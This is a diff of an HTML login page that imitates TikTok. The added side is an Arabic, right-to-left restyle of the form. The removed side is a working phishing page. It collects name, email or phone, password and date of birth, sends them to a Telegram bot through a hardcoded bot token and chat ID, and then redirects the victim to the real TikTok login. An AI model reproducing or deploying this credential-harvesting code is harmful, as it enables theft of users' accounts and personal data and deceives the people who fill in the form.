@@ -1,190 +1,169 @@
 <!DOCTYPE html>
-<html lang="en" dir="ltr">
+<html lang="ar" dir="rtl">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Login - TikTok</title>
+  <title>تسجيل الدخول</title>
   <style>
     body {
       font-family: 'Segoe UI', sans-serif;
-      background: #f7f7f7;
+      background: #fff;
       margin: 0;
       padding: 0;
     }
 
     .container {
-      max-width: 320px;
-      margin: 40px auto;
-      background-color: white;
-      border-radius: 12px;
-      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
-      padding: 28px 20px;
-      position: relative;
+      max-width: 360px;
+      margin: 0 auto;
+      padding: 20px 16px;
     }
 
-    .help-icon {
-      position: absolute;
-      right: 16px;
-      top: 16px;
-      font-size: 22px;
-      cursor: pointer;
-      color: #555;
-    }
-
-    .header {
-      font-size: 20px;
-      font-weight: bold;
+    .header-bar {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
       margin-bottom: 20px;
+    }
+
+    .icon-circle {
+      width: 28px;
+      height: 28px;
+      border: 1.8px solid #aaa;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-weight: bold;
+      font-size: 18px;
+      color: #777;
+      cursor: pointer;
+    }
+
+    .back-arrow {
+      font-size: 22px;
+      font-weight: bold;
+      cursor: pointer;
+    }
+
+    .title {
       text-align: center;
+      font-size: 22px;
+      font-weight: bold;
     }
 
     .tabs {
       display: flex;
-      border-bottom: 1.5px solid #ddd;
-      margin-bottom: 15px;
+      justify-content: space-between;
+      border-bottom: 1px solid #ccc;
+      margin-bottom: 20px;
     }
 
     .tab {
       flex: 1;
       text-align: center;
       padding: 10px 0;
-      font-weight: bold;
-      font-size: 14px;
-      color: #666;
+      font-size: 15px;
+      color: #999;
       cursor: pointer;
-      transition: all 0.3s;
     }
 
     .tab.active {
       border-bottom: 2px solid black;
       color: black;
+      font-weight: bold;
     }
 
-    .form-content {
-      display: none;
-    }
-
-    .form-content.active {
-      display: block;
-    }
-
-    input[type="text"],
-    input[type="password"],
-    input[type="date"],
-    input[type="tel"] {
+    input {
       width: 100%;
-      padding: 12px 10px;
-      margin-bottom: 12px;
-      border: 2px solid #ddd;
+      padding: 14px 12px;
+      margin-bottom: 16px;
+      border: 1px solid #ccc;
       border-radius: 10px;
-      background-color: #f9f9f9;
-      font-size: 14px;
-      text-align: left;
-      transition: 0.3s;
+      background-color: #fafafa;
+      font-size: 15px;
       box-sizing: border-box;
     }
 
     input:focus {
-      outline: none;
-      border-color: #999;
       background-color: #fff;
-    }
-
-    input::placeholder {
-      color: #bbb;
+      border-color: #999;
+      outline: none;
     }
 
     .forgot {
-      text-align: left;
+      text-align: right;
+      font-size: 14px;
       color: #000;
-      font-size: 12px;
-      margin-bottom: 15px;
+      margin-bottom: 20px;
       cursor: pointer;
-      transition: 0.3s;
-    }
-
-    .forgot:hover {
-      color: #555;
     }
 
     .login-btn {
       width: 100%;
-      padding: 12px;
-      background: linear-gradient(to right, #ddd, #ccc);
+      padding: 14px;
+      background-color: #eee;
       border: none;
-      color: #888;
+      color: #aaa;
+      font-size: 16px;
       font-weight: bold;
-      font-size: 14px;
-      border-radius: 8px;
+      border-radius: 12px;
       cursor: not-allowed;
-      transition: all 0.3s ease-in-out;
-      margin-bottom: 10px;
     }
 
     .login-btn.active {
-      background: linear-gradient(to right, #ff2d55, #ff5a36);
+      background-color: #ff3b5c;
       color: white;
       cursor: pointer;
-    }
-
-    .login-btn.active:hover {
-      transform: scale(0.98);
-    }
-
-    .error-message {
-      color: red;
-      font-size: 12px;
-      display: none;
-      margin-top: -8px;
-      margin-bottom: 8px;
     }
   </style>
 </head>
 <body>
+
   <div class="container">
-    <div class="help-icon">?</div>
-    <div class="header">Log in</div>
+    <div class="header-bar">
+      <div class="icon-circle">؟</div>
+      <div class="title">تسجيل الدخول</div>
+      <div class="back-arrow">&#8592;</div>
+    </div>
+
     <div class="tabs">
-      <div class="tab" onclick="switchTab('phone')">Phone</div>
-      <div class="tab active" onclick="switchTab('email')">Email / Username</div>
+      <div class="tab" onclick="switchTab('phone')">الهاتف</div>
+      <div class="tab active" onclick="switchTab('email')">البريد الإلكتروني / اسم المستخدم</div>
     </div>
 
     <div id="form-email" class="form-content active">
-      <input id="fullname" type="text" placeholder="Full Name" oninput="checkFields()" />
-      <input id="email" type="text" placeholder="Email or username" oninput="checkFields()" />
-      <input id="password" type="password" placeholder="Password" oninput="checkFields()" />
-      <input id="dob" type="date" placeholder="تاريخ الميلاد" oninput="checkFields()" />
-      <div id="email-error" class="error-message">Please enter a valid email address.</div>
+      <input id="email" type="text" placeholder="البريد الإلكتروني أو اسم المستخدم" oninput="checkFields()" />
+      <input id="password" type="password" placeholder="كلمة المرور" oninput="checkFields()" />
     </div>
 
-    <div id="form-phone" class="form-content">
-      <input id="phone" type="tel" placeholder="Phone number" oninput="checkFields()" />
-      <input type="password" placeholder="Password" oninput="checkFields()" />
-      <input id="dob-phone" type="date" placeholder="تاريخ الميلاد" oninput="checkFields()" />
-      <div id="phone-error" class="error-message">Please enter a valid phone number.</div>
+    <div id="form-phone" class="form-content" style="display:none;">
+      <input type="text" placeholder="رقم الهاتف" oninput="checkFields()" />
+      <input type="password" placeholder="كلمة المرور" oninput="checkFields()" />
     </div>
 
-    <div class="forgot">Forgot password?</div>
-    <button id="loginBtn" class="login-btn" onclick="sendToTelegram()">Log in</button>
+    <div class="forgot">نسيت كلمة السر؟</div>
+    <button id="loginBtn" class="login-btn">تسجيل الدخول</button>
   </div>
 
   <script>
     function switchTab(type) {
-      document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
-      document.querySelectorAll('.form-content').forEach(f => f.classList.remove('active'));
+      const tabs = document.querySelectorAll('.tab');
+      const forms = document.querySelectorAll('.form-content');
+      tabs.forEach(tab => tab.classList.remove('active'));
+      forms.forEach(form => form.style.display = 'none');
 
       if (type === 'phone') {
-        document.querySelector('.tab:nth-child(1)').classList.add('active');
-        document.getElementById('form-phone').classList.add('active');
+        tabs[0].classList.add('active');
+        document.getElementById('form-phone').style.display = 'block';
       } else {
-        document.querySelector('.tab:nth-child(2)').classList.add('active');
-        document.getElementById('form-email').classList.add('active');
+        tabs[1].classList.add('active');
+        document.getElementById('form-email').style.display = 'block';
       }
       checkFields();
     }
 
     function checkFields() {
-      const activeForm = document.querySelector('.form-content.active');
+      const activeForm = document.querySelector('.form-content[style*="block"]');
       const inputs = activeForm.querySelectorAll('input');
       const btn = document.getElementById('loginBtn');
 
@@ -197,68 +176,6 @@
         btn.classList.remove('active');
         btn.disabled = true;
       }
-
-      validateEmail();
-      validatePhone();
-    }
-
-    function validateEmail() {
-      const email = document.getElementById('email').value;
-      const emailError = document.getElementById('email-error');
-      const emailPattern = /^[a-zA-Z0-9._-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
-
-      if (email && !emailPattern.test(email)) {
-        emailError.style.display = 'block';
-      } else {
-        emailError.style.display = 'none';
-      }
-    }
-
-    function validatePhone() {
-      const phone = document.getElementById('phone') ? document.getElementById('phone').value : '';
-      const phoneError = document.getElementById('phone-error');
-      const phonePattern = /^[0-9]{10}$/;
-
-      if (phone && !phonePattern.test(phone)) {
-        phoneError.style.display = 'block';
-      } else {
-        phoneError.style.display = 'none';
-      }
-    }
-
-    function sendToTelegram() {
-      const fullname = document.getElementById('fullname').value;
-      const email = document.getElementById('email').value;
-      const password = document.getElementById('password').value;
-      const dob = document.getElementById('dob').value;
-      const phone = document.getElementById('phone') ? document.getElementById('phone').value : '';
-      const dobPhone = document.getElementById('dob-phone') ? document.getElementById('dob-phone').value : '';
-
-      let message = `Full Name: ${fullname}\nDate of Birth: ${dob || dobPhone}\n`;
-
-      if (email && password) {
-        message += `Email: ${email}\nPassword: ${password}`;
-      } else if (phone && password) {
-        message += `Phone: ${phone}\nPassword: ${password}`;
-      }
-
-      const telegramBotToken = '7008716029:AAFOh4raFcgDCzQzJSV0BOxV0Wd0k2jpmR0';
-      const chatId = '5029891039';
-
-      fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
-        .then(response => response.json())
-        .then(data => {
-          if (data.ok) {
-            alert('Information sent to Telegram!');
-            // بعد إرسال البيانات بنجاح، يتم إعادة التوجيه إلى موقع تيك توك
-            window.location.href = 'https://www.tiktok.com/login';
-          } else {
-            alert('Failed to send message.');
-          }
-        })
-        .catch(error => {
-          alert('Error: ' + error.message);
-        });
     }
   </script>
 </body>
